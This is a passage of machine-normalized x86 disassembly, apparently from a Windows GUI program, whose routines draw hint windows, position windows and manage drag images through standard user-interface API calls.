jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406ab8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44afd4
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_4518a8
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44e3d0
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4518e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4518d8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_451920
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_448f20
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_4489fc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45197c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448ff8
test bl bl
jle r-xdata
xor eax eax
call sub_446ff0
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4519bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424c0c
xor eax eax
push ebp
push sub_451a57
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425038
xor eax eax
push ebp
push sub_451a34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451a3b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_425038
retn
sub_451a68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4523a0
mov edx 0x80ffff
mov eax esi
call sub_449fc0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_424ed8
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424910
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_451ad4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44d5a8
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bed8
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44d540
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_451b40
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_451b96
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451b9d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ReleaseDC
retn
sub_451ba4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_451c3d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_424028
mov eax ebx
call sub_44c140
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_449e20
mov eax [ ebp - 0x14 ]
call sub_404410
push eax
mov eax [ ebx + 0x208 ]
call sub_424fb8
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451c44
lea eax [ ebp - 0x14 ]
call sub_403f50
retn
sub_451c4c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_451cb8
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_451d43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451d4a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449e20
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_424e18
mov edx eax
add edx 0x6
mov eax esi
call sub_4495dc
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_449e20
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_424e34
mov edx eax
add edx 0x4
mov eax esi
call sub_449600
sub_451d50
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_451f29
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449e50
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44b078
mov eax [ esi ]
call sub_467320
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46732c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_467320
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_467314
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_46732c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_467308
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_467314
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_467308
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44de50
push 0x4
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451f30
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404210
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_454fe8
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call [ rw-data ]
sub_451f38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_451f60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_416f24
mov eax esi
call sub_44c140
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ esi + 0x208 ]
call sub_424fb8
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_451fbc
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416f24
call sub_43dfe8
call sub_43e0c8
test al al
jne r-xdata
call sub_43dfe8
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43e2bc
push esp
push 0x1
push 0xf
push 0x0
call sub_43dfe8
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43e138
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_452028
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44e758
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_45204c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4520a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452164
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4677f4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429d78
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4677f4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429d78
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_452170
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_456f90
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4521d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4578c0
mov eax ebx
call sub_456e54
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_4521fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_456e54
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_4520a4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_45225c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_452170
push 0x0
call ShowCursor
sub_45225c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_456e54
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_4522c0
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45204c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_4522c0
push ebx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_4522e4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_45204c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_452358
push ebx
push esi
mov esi eax
mov eax esi
call sub_456e54
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_4522c0
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_4521b8
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4523a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c448
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_4489fc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4523fc
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c56c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_45244c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424c0c
xor eax eax
push ebp
push sub_4524ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_425038
xor eax eax
push ebp
push sub_4524c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_448a14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4524ce
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_425038
retn
sub_4524fc
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_452590
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_452518
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_452590
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_452b88
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_452590
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_4525c4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_452654
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov edx 0x2
call sub_452654
jmp r-xdata
retn
sub_45260c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4526c0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov edx 0x2
call sub_4526c0
jmp r-xdata
retn
sub_452654
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_452a88
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4526c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_452574
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_452a88
push eax
mov eax esi
call sub_4525c4
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_452a88
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_452770
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_452574
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_452b88
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4526c0
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_452574
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4526c0
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_4525c4
mov edx eax
add edx esi
mov eax ebx
call sub_452ab0
mov edx edi
mov eax ebx
call sub_452ab0
jmp r-xdata
mov eax ebx
call sub_452910
mov eax ebx
call sub_452b60
mov ebx eax
test ebx ebx
jne r-xdata
sub_452818
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f50
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fa4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
sub_45285c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403350
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4528cd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_44ab20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_4528e0
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_452b60
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_452910
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4526c0
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4526c0
mov esi eax
push ebp
call sub_4528e0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_452b60
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
